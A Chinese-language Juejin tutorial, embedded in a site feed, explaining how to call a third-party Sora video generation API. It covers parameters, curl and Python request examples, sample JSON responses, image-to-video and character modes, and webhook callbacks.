<h4 data-id="heading-19">📌往期精彩</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsMAKhSLNvmU1ddxg0yv9Fg" target="_blank" title="https://mp.weixin.qq.com/s/sMAKhSLNvmU1ddxg0yv9Fg" ref="nofollow noopener noreferrer">《重构了20个SpringBoot项目后，总结出这套稳定高效的架构设计》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F184BGM_pdMFLc0ASrferwQ" target="_blank" title="https://mp.weixin.qq.com/s/184BGM_pdMFLc0ASrferwQ" ref="nofollow noopener noreferrer">《代码里全是 new 对象，真的很 Low 吗？我认真想了一晚》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FX-MSa0CHwVW_qgPezbpMUA" target="_blank" title="https://mp.weixin.qq.com/s/X-MSa0CHwVW_qgPezbpMUA" ref="nofollow noopener noreferrer">《这 5 个冷门 HTML 标签，让我直接删了100 行 JS 代码》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FGkU5V9H355YWwChpay9zTQ" target="_blank" title="https://mp.weixin.qq.com/s/GkU5V9H355YWwChpay9zTQ" ref="nofollow noopener noreferrer">《这 10 个 Vue3 性能优化技巧很实用，但很多项目都没用上》</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Sora Videos Generation API 对接说明]]></title>    <link>https://juejin.cn/post/7590020026394869814</link>    <guid>https://juejin.cn/post/7590020026394869814</guid>    <pubDate>2026-01-02T09:50:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026394869814" data-draft-id="7590654280899280939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Sora Videos Generation API 对接说明"/> <meta itemprop="keywords" content="Sora,API"/> <meta itemprop="datePublished" content="2026-01-02T09:50:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="崔庆才丨静觅"/> <meta itemprop="url" content="https://juejin.cn/user/1521379821230269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Sora Videos Generation API 对接说明
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379821230269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    崔庆才丨静觅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:50:19.000Z" title="Fri Jan 02 2026 09:50:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文将介绍一种 Sora Videos Generation API 对接说明，它是可以通过输入自定义参数来生成Sora官方的视频。</p>
<h2 data-id="heading-0">申请流程</h2>
<p>要使用 API，需要先到 <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2F99a24421-2e22-4028-8201-e19cb834b67e" target="_blank" title="https://platform.acedata.cloud/documents/99a24421-2e22-4028-8201-e19cb834b67e" ref="nofollow noopener noreferrer">Sora Videos Generation API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/723bf6d78fa64d0f8e03b2445abcb825~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=dMyisU9WguOL455M%2FPEpqe9dBqY%3D" alt="" loading="lazy"/></p>
<p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
<p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
<h2 data-id="heading-1">基本使用</h2>
<p>首先先了解下基本的使用方式，就是输入提示词 <code>prompt</code>、参考图片链接数组 <code>image_urls</code> 以及模型 <code>model</code>，便可获得处理后的结果，具体的内容如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33781f16d5cb45cb89c9d50261d8ca80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=WfTA%2FkjxAFJtvc6b59eaHsX%2BSQ0%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>可以看到这里我们设置了 Request Headers，包括：</p>
<ul>
<li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
<li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
</ul>
<p>另外设置了 Request Body，包括：</p>
<ul>
<li><code>model</code>：生成视频的模型，主要有<code>sora-2</code>、<code>sora-2-pro</code>，目前 <code>sora-2</code>、<code>sora-2-pro</code>可以自主选择<code>size</code>、<code>duration</code>参数的视频，其中<code>sora-2-pro</code>可以支持<code>duration</code>为25s的视频，而<code>sora-2</code>只支持10、15秒的视频。</li>
<li><code>size</code>：此次视频生成任务的清晰度，分别有 <code>small</code> 、 <code>large</code>。</li>
<li><code>image_urls</code>：需要上传的参考图片链接或者Base64编码数组。</li>
<li><code>duration</code>：此次视频生成任务的时长，分别有10s、15s、25s，目前只有<code>sora-2-pro</code>支持25s。</li>
<li><code>character_start</code>/<code>character_end</code>：角色在画面中的起止位置（0-1），用于控制主体位置。</li>
<li><code>orientation</code>：画幅方向，支持 <code>landscape</code>、<code>portrait</code>、<code>square</code>。</li>
<li><code>prompt</code>：提示词。</li>
<li><code>callback_url</code>：需要回调结果的URL。</li>
</ul>
<p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5395eedd4dda4e44ad1808f8e53c40bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=ySvYNdCndSQj7gpY19vAkW2a54o%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"6bf7fb83-5814-4e3e-a4ad-bfa0c26c0b33"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"96166698-4b66-478d-a26b-77a7269c9e01"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k7770rgsevxsmtpbn7xnm5gh"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k7770rgsevxsmtpbn7xnm5gh%2Ftask_01k7770rgsevxsmtpbn7xnm5gh_genid_0bf958d3-cae7-4298-b7b6-99ae439a1ea6_25_10_10_14_06_975715%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A30%3A38Z&amp;se=2025-10-16T13%3A30%3A38Z&amp;sks=b&amp;skt=2025-10-10T12%3A30%3A38Z&amp;ske=2025-10-16T13%3A30%3A38Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=8ebb0df1-a278-4e2e-9c20-f2d373479b3a&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=jigY6Z5qp8%2BTXYobaW0EAJ4%2Fbx6G7t6V1P0iyDeUq48%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>返回结果一共有多个字段，介绍如下：</p>
<ul>
<li><code>success</code>，此时视频生成任务的状态情况。</li>
<li><code>task_id</code>，此时视频生成任务ID。</li>
<li><code>trace_id</code>，此时视频生成跟踪ID。</li>
<li><code>data</code>，此时视频生成任务的结果列表。
<ul>
<li><code>id</code>，此时视频生成任务的视频ID。</li>
<li><code>video_url</code>，此时视频生成任务的视频链接。</li>
<li><code>state</code>，此时视频生成任务的状态。</li>
</ul>
</li>
</ul>
<p>可以看到我们得到了满意的视频信息，我们只需要根据结果中 <code>data</code> 的视频链接地址获取生成的Sora视频即可。</p>
<p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
<pre><code class="hljs language-shell" lang="shell">curl -X POST 'https://api.acedata.cloud/sora/videos' \
-H 'accept: application/json' \
-H 'authorization: Bearer {token}' \
-H 'content-type: application/json' \
-d '{
  "size": "large",
  "duration": 15,
  "orientation": "landscape",
  "prompt": "cat running on the river",
  "model": "sora-2"
}'
</code></pre>
<h2 data-id="heading-2">图生视频任务</h2>
<p>如果想图生视频任务任务， 首先参数<code>image_urls</code>必须传入参考图片链接，就可以指定如下内容：</p>
<ul>
<li>image_urls：该图生视频任务采用的参考图链接数组，。</li>
</ul>
<p>填写样例如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec562e3f72a64ccb9a68b84fdb3af83a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=1YNAC%2F6eDR%2BdL6xjpGtrccA%2F%2BNA%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>填写完毕之后自动生成了代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6b5bcec650741daa7cb335eeed65250~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=Z7wGzt9N6M9ROf8fq7kKG1bUKbE%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>对应的代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"large"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">15</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"image_urls"</span>: [<span class="hljs-string">"https://cdn.acedata.cloud/11wfp4.png"</span>]
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"success"</span>: true,
  <span class="hljs-string">"task_id"</span>: <span class="hljs-string">"dd392ff0-dcb7-4c7a-afd0-9bd4f65c803a"</span>,
  <span class="hljs-string">"trace_id"</span>: <span class="hljs-string">"04fd151c-e942-4c1c-a6ab-9a1b1fe54172"</span>,
  <span class="hljs-string">"data"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"sora-2:task_01k777af4hfmg9g7yfvwsc6zws"</span>,
      <span class="hljs-string">"video_url"</span>: <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777af4hfmg9g7yfvwsc6zws%2Ftask_01k777af4hfmg9g7yfvwsc6zws_genid_92bae0c5-1703-4a5f-9d9f-c9ed2f9e7176_25_10_10_14_12_924695%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A37%3A32Z&amp;se=2025-10-16T13%3A37%3A32Z&amp;sks=b&amp;skt=2025-10-10T12%3A37%3A32Z&amp;ske=2025-10-16T13%3A37%3A32Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=5j4dibeaSsDmEka5c%2B9CKHZhRPdqfClQ0tIh03TWXsM%3D&amp;az=oaivgprodscus"</span>,
      <span class="hljs-string">"state"</span>: <span class="hljs-string">"succeeded"</span>
    }
  ]
}
</code></pre>
<p>可以看到，生成的效果是图生建视频的，结果与上文类似。</p>
<h2 data-id="heading-3">角色生成视频任务</h2>
<p>如果想角色生成视频任务， 首先参数<code>character_url</code>必须传入创建角色需要的视频链接，注意视频中一定不能出现真人，否则会失败，就可以指定如下内容：</p>
<ul>
<li>character_url：创建角色需要的视频链接，注意视频中一定不能出现真人，否则会失败。</li>
</ul>
<p>填写样例如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c0d114d6a1848e2a482ddf5a0fdcaed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=WVihtmB7lRCzkIsOq0xt5l97dN0%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>填写完毕之后自动生成了代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14764bbf558f46d4a3a3e9aec936f7bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=yGW3NLL1Ox4gX8ywLBiw%2FBkv0RY%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>对应的代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"small"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">10</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"character_url"</span>: <span class="hljs-string">"https://cdn.acedata.cloud/pdidf5.mp4"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"character_end"</span>: <span class="hljs-number">3</span>,
    <span class="hljs-string">"character_start"</span>: <span class="hljs-number">1</span>
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"d9bf5461-29b5-47fd-be90-1fe9197df259"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b7992643-9207-40d6-956b-7577728acc67"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k8ykrztefavaypw6xanw305b"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/cdn/20251101/bee4eeeb4c4660b46dac4548a1ffbc.mp4"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>可以看到，生成的效果是角色生成视频，结果与上文类似。</p>
<h2 data-id="heading-4">异步回调</h2>
<p>由于 Sora Videos Generation API生成的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
<p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成视频的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
<p>下面我们通过示例来了解下具体怎样操作。</p>
<p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwebhook.site%2F%25EF%25BC%258C%25E6%2589%2593%25E5%25BC%2580%25E8%25AF%25A5%25E7%25BD%2591%25E7%25AB%2599%25E5%258D%25B3%25E5%258F%25AF%25E5%25BE%2597%25E5%2588%25B0%25E4%25B8%2580%25E4%25B8%25AA" target="_blank" title="https://webhook.site/%EF%BC%8C%E6%89%93%E5%BC%80%E8%AF%A5%E7%BD%91%E7%AB%99%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA" ref="nofollow noopener noreferrer">webhook.site/，打开该网站即可得到一…</a> Webhook URL，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/791d8b8bb36547a591c98a9adfe97de3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=bcwNmYS2ZkHlL8zDEThrfr0sTpE%3D" alt="" loading="lazy"/></p>
<p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code>。</p>
<p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入相应的参数，具体的内容如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c3686f6b9a84192983044d787d6dab8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=cHogTFqv98IL7vP6VCwXj7JoW9c%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>稍等片刻，我们可以在 <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code> 上观察到生成歌曲的结果，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/671ddd219b844365812e0b513defebd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=kL2KcXjSKWSLIEovekQi7AH77Js%3D" alt="" loading="lazy"/></p>
<p>内容如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fb751e1e-4705-49ea-9fd4-5024b7865ea2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k777hjrbfrgs2060q5zvf2a5"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777hjrbfrgs2060q5zvf2a5%2Ftask_01k777hjrbfrgs2060q5zvf2a5_genid_b8e2e5d1-a579-49ca-a21c-cb3869685cce_25_10_10_14_15_147334%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A38%3A49Z&amp;se=2025-10-16T13%3A38%3A49Z&amp;sks=b&amp;skt=2025-10-10T12%3A38%3A49Z&amp;ske=2025-10-16T13%3A38%3A49Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=p4aMqXqkP%2FI1IhOVGCB9JL8vUUvfNBBF12ESpKhKXOk%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
